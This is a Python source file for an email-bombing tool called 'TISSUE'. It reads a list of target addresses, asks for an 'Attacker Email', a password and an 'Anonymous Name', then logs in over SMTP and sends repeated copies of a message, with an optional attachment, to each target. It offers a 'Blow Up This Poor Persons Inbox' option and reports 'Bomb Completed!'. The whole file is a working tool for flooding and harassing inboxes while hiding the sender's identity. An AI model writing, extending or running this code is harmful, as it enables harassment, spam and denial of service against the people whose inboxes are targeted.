from getpass import getpass
from time import sleep
import sys
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
from rich.progress import track
from rich import print

art = "[bold green]     _                      _______                      _\n  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_\n dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb\n V      ~ Mb          dOOOOOOOOOOOOOOOOOb          dM ~      V\n          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'\n           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'\n      __     `YMMM| OP'~ YOOOOOOOOOOOP ~`YO |MMMP'     __\n    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.\n _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._\n\n             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'\n     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.\n   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.\n  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.\n  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM\n  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP\n   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'\n     `'                  `OObNNNNNdOO'                   `'\n                           `~OOOOO~'   TISSUE"

def multiple_emails():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

    print('\n')
    print(art)
    print('\n[bold cyan]          ____________________________________________\n\n             For this to work you need to make sure\n           you have all the emails you want listed in\n        the [bold white]email_list.txt[/bold white] file otherwise this wont work\n          ____________________________________________')

    list = input('\n Are the people you want to email listed [y/n]? ')
    if list == 'y':
        email_list = input('\n Enter the file path to the email list: ')
        with open(email_list,'r') as f:
            email_list = [line.strip() for line in f]

        print("\n [1] Send One Email ")
        print('\n [2] Blow Up This Poor Persons Inbox ')
        print('\n [3] Main Menu ')
        answer = input('\n -> ')
        if answer == '1':
            number = 1
        elif answer == '2':
            print('\n[bold red] [WARNING][/bold red] This could take a long time\n and/or may not be able to send all the emails! ')
            warning = input('\n [return] -> ')
            number = input('\n Number of Emails: ')
        elif answer == '3':
            if platform.system() == 'Windows':
                os.system('py main.py')
            else:
                os.system('Python3 main.py')
        else:
            print('[bold red] [!] Unrecognized Input ')
            sys.exit()

        message = MIMEMultipart()
        username = input('\n Anonymous Name: ')
        sender_email = input('\n Attacker Email: ')
        password = getpass('\n Attacker Password: ')
        subject = input('\n Subject: ')
        body = input('\n Message: ')
        message.attach(MIMEText(body, 'plain'))

        server = input('\n Are you using gmail [y/n]? ')
        if server == 'y':
            port = 587
            smtp = 'smtp.gmail.com'
        elif server == 'n':
            port = input('\n Port: ')
            smtp = input('\n SMTP Server [smtp.example.com]: ')
        else:
            print('[bold red] [!] Unrecognized Input ')
            sys.exit()

        file = input('\n Do you want to attach a file [y/n]? ')
        if file == 'y':
            filename = input('\n File Path: ')
            attachment = open(filename, 'rb')
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f'attachment; filename={filename}')
            message.attach(p)
        elif file not in ['n', 'y']:
            print('[bold red] [!] Unrecognized Input ')
            sys.exit()

        try:
            with smtplib.SMTP(smtp, port) as server:
                server.ehlo()
                server.starttls()
                server.login(sender_email, password)
                for email in email_list:
                    for i in track(range(1, int(number) + 1), description=f"[bold cyan] Sending to {email}..."):
                        message['From'] = username
                        message['To'] = email
                        message['Subject'] = subject
                        text = message.as_string()
                        sleep(1)
                        server.sendmail(sender_email, email, text)
                        sys.stdout.flush()
                server.quit()
            print('[bold cyan]\n Bomb Completed!')
            print(f"[bold cyan]  {number} E-mails sent! ")
            sys.exit()

        except KeyboardInterrupt:
            print('\n[bold red] [!] Bombing Interrupted ')
            sys.exit()

        except Exception as e:
            print("\n[bold red] [!] Something went wrong.. Printing the error: {0}".format(e))

    elif list == 'n':
        print('\n[bold cyan] Add the emails you want to the list! ')
        sys.exit()
    else:
        print('[bold red] [!] Unrecognized Input ')
        sys.exit()
